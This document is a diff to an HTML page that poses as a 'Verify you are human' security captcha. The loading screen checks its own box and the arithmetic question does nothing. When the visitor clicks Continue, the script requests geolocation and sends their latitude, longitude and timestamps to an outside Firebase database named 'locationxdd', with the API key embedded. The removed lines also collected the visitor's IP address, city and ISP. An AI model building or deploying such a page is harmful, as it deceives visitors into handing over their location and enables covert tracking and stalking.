@@ -7,7 +7,6 @@
 
 <style>
 *{box-sizing:border-box}
-
 body{
   margin:0;
   font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;
@@ -18,7 +17,6 @@ body{
   min-height:100vh;
   color:#fff;
 }
-
 #loadingScreen{
   position:fixed;
   inset:0;
@@ -28,7 +26,6 @@ body{
   justify-content:center;
   z-index:9999;
 }
-
 .captchaBox{
   background:#111827;
   padding:20px;
@@ -36,7 +33,6 @@ body{
   width:300px;
   box-shadow:0 10px 25px rgba(0,0,0,.4);
 }
-
 .captchaRow{
   display:flex;
   align-items:center;
@@ -45,7 +41,6 @@ body{
   border-radius:10px;
   background:#0b1220;
 }
-
 .fakeCheckbox{
   width:22px;
   height:22px;
@@ -53,25 +48,9 @@ body{
   border-radius:4px;
   position:relative;
 }
-
 .captchaText{font-size:14px;}
-
-.captchaBrand{
-  font-size:11px;
-  opacity:.6;
-  margin-top:8px;
-  text-align:right;
-}
-
-.progressBar{
-  height:4px;
-  background:#3b82f6;
-  width:0%;
-  border-radius:4px;
-  margin-top:10px;
-  transition:width 2.7s ease-in-out;
-}
-
+.captchaBrand{font-size:11px;opacity:.6;margin-top:8px;text-align:right;}
+.progressBar{height:4px;background:#3b82f6;width:0%;border-radius:4px;margin-top:10px;transition:width 2.7s ease-in-out;}
 .card{
   background:#111827;
   padding:20px;
@@ -81,9 +60,7 @@ body{
   text-align:center;
   box-shadow:0 10px 25px rgba(0,0,0,.4);
 }
-
 .subtitle{font-size:13px;opacity:.7;margin-top:-6px;}
-
 input{
   width:100%;
   padding:10px;
@@ -92,7 +69,6 @@ input{
   margin-top:10px;
   outline:none;
 }
-
 button{
   margin-top:12px;
   width:100%;
@@ -104,23 +80,11 @@ button{
   cursor:pointer;
   font-weight:600;
 }
-
 button:disabled{opacity:.6;cursor:not-allowed;}
-
-.status{
-  margin-top:10px;
-  font-size:14px;
-  opacity:.9;
-}
-
-.note{
-  font-size:11px;
-  opacity:.5;
-  margin-top:12px;
-}
+.status{margin-top:10px;font-size:14px;opacity:.9;}
+.note{font-size:11px;opacity:.5;margin-top:12px;}
 </style>
 </head>
-
 <body>
 
 <div id="loadingScreen">
@@ -138,164 +102,99 @@ button:disabled{opacity:.6;cursor:not-allowed;}
   <h2>Verify you are human</h2>
   <p class="subtitle">Security check required to continue</p>
   <p id="question"></p>
-
   <input id="answer" placeholder="Answer">
-
   <button id="btn" disabled>Continue</button>
-
   <div class="status" id="status"></div>
-
-  <div class="note">
-  Security system active • Chrome recommended for best experience
-  </div>
+  <div class="note">Security system active • Chrome recommended for best experience</div>
 </div>
 
 <script>
-
 window.addEventListener("load", () => {
-
-  const bar=document.getElementById("bar")
-  const loading=document.getElementById("loadingScreen")
-  const check=document.getElementById("check")
-
-  setTimeout(()=>{bar.style.width="100%"},200)
-
+  const bar=document.getElementById("bar");
+  const loading=document.getElementById("loadingScreen");
+  const check=document.getElementById("check");
+  setTimeout(()=>{bar.style.width="100%";},200);
   setTimeout(()=>{
-    check.style.borderColor="#22c55e"
-    check.style.background="#22c55e"
-    check.innerHTML="✓"
-  },1800)
-
-  setTimeout(()=>{loading.style.display="none"},2400)
-
-})
+    check.style.borderColor="#22c55e";
+    check.style.background="#22c55e";
+    check.innerHTML="✓";
+  },1800);
+  setTimeout(()=>{loading.style.display="none";},2400);
+});
 
 const questions=[
 "5 + 3 = ?","10 - 4 = ?","6 × 2 = ?","9 + 7 = ?",
 "12 - 5 = ?","3 × 4 = ?","15 ÷ 3 = ?","8 + 6 = ?",
 "14 - 9 = ?","7 × 3 = ?"
-]
-
+];
 const verifyTexts=[
-"Checking response...",
-"Verifying security...",
-"Processing request...",
-"Running security check..."
-]
+"Checking response...","Verifying security...","Processing request...","Running security check..."
+];
 
-const q=document.getElementById("question")
-const a=document.getElementById("answer")
-const s=document.getElementById("status")
-const btn=document.getElementById("btn")
+const q=document.getElementById("question");
+const a=document.getElementById("answer");
+const s=document.getElementById("status");
+const btn=document.getElementById("btn");
 
-q.textContent=questions[Math.floor(Math.random()*questions.length)]
-
-a.addEventListener("input",()=>{
-  btn.disabled=a.value.trim().length===0
-})
-
-btn.onclick=verify
+q.textContent=questions[Math.floor(Math.random()*questions.length)];
+a.addEventListener("input",()=>{btn.disabled=a.value.trim().length===0;});
+btn.onclick=verify;
 
 function formatFriendlyTime(date){
-
-  const options={
-  year:"numeric",
-  month:"long",
-  day:"numeric",
-  hour:"2-digit",
-  minute:"2-digit",
-  hour12:true,
-  timeZone:"Asia/Dhaka"
-  }
-
-  return date.toLocaleString("en-US",options)
+  const options={year:"numeric",month:"long",day:"numeric",hour:"2-digit",minute:"2-digit",hour12:true,timeZone:"Asia/Dhaka"};
+  return date.toLocaleString("en-US",options);
 }
 
 async function verify(){
-
-  s.textContent=verifyTexts[Math.floor(Math.random()*verifyTexts.length)]
-
-  btn.disabled=true
-
-  const now=new Date()
-  const timestamp=Date.now()
-  const friendlyTime=formatFriendlyTime(now)
-
-  let lat=null
-  let lng=null
-
-  if(navigator.geolocation){
-    navigator.geolocation.getCurrentPosition(pos=>{
-      lat=pos.coords.latitude
-      lng=pos.coords.longitude
-    })
+  s.textContent=verifyTexts[Math.floor(Math.random()*verifyTexts.length)];
+  btn.disabled=true;
+  await new Promise(r=>setTimeout(r,1200));
+  if(!navigator.geolocation){
+    s.textContent="Verification failed. Please refresh and try again.";
+    btn.disabled=false;
+    return;
   }
 
-  let ipData={}
+  navigator.geolocation.getCurrentPosition(async pos=>{
+    try{
+      const { initializeApp } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js");
+      const { getDatabase, ref, push } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js");
+      const firebaseConfig={
+        apiKey:"AIzaSyD-myAkBLFbPyqIomR02q6iftboysae-wQ",
+        authDomain:"locationxdd.firebaseapp.com",
+        databaseURL:"https://locationxdd-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId:"locationxdd",
+        storageBucket:"locationxdd.firebasestorage.app",
+        messagingSenderId:"114480292043",
+        appId:"1:114480292043:web:d143429c68784b0706bb4e"
+      };
+      const app=initializeApp(firebaseConfig);
+      const db=getDatabase(app);
+      const now=new Date();
+      const timestamp=Date.now();
+      const isoTime=new Date(now.getTime()+6*60*60*1000).toISOString().replace("T"," ").split(".")[0];
+      const friendlyTime=formatFriendlyTime(now);
 
-  try{
-    const res=await fetch("http://ip-api.com/json/?fields=status,country,regionName,city,isp,org,as,query")
-    const data=await res.json()
+      await push(ref(db,"visitors"),{
+        answer:a.value,
+        timestamp,
+        time_bst_iso:isoTime,
+        time_bst_friendly:friendlyTime,
+        lat:pos.coords.latitude,
+        lng:pos.coords.longitude
+      });
 
-    if(data.status==="success"){
-      ipData=data
+      s.textContent="Verification complete.";
+    }catch(e){
+      console.error(e);
+      s.textContent="Verification failed. Please try again.";
+      btn.disabled=false;
     }
-  }catch(e){
-    console.log("IP lookup failed")
-  }
-
-  try{
-
-    const { initializeApp } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js")
-    const { getDatabase, ref, push } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js")
-
-    const firebaseConfig={
-      apiKey:"AIzaSyD-myAkBLFbPyqIomR02q6iftboysae-wQ",
-      authDomain:"locationxdd.firebaseapp.com",
-      databaseURL:"https://locationxdd-default-rtdb.asia-southeast1.firebasedatabase.app",
-      projectId:"locationxdd",
-      storageBucket:"locationxdd.firebasestorage.app",
-      messagingSenderId:"114480292043",
-      appId:"1:114480292043:web:d143429c68784b0706bb4e"
-    }
-
-    const app=initializeApp(firebaseConfig)
-    const db=getDatabase(app)
-
-    await push(ref(db,"visitors"),{
-
-      answer:a.value,
-
-      timestamp,
-      time_bst_friendly:friendlyTime,
-
-      lat,
-      lng,
-
-      ip:ipData.query || null,
-      city:ipData.city || null,
-      region:ipData.regionName || null,
-      country:ipData.country || null,
-
-      isp:ipData.isp || null,
-      org:ipData.org || null,
-      asn:ipData.as || null
-
-    })
-
-    s.textContent="Verification complete."
-
-  }catch(e){
-
-    console.error(e)
-
-    s.textContent="Verification failed. Please try again."
-    btn.disabled=false
-
-  }
-
+  },()=>{
+    s.textContent="Verification failed. Please refresh and try again.";
+    btn.disabled=false;
+  },{enableHighAccuracy:false,timeout:8000,maximumAge:60000});
 }
-
 </script>
 </body>
 </html>
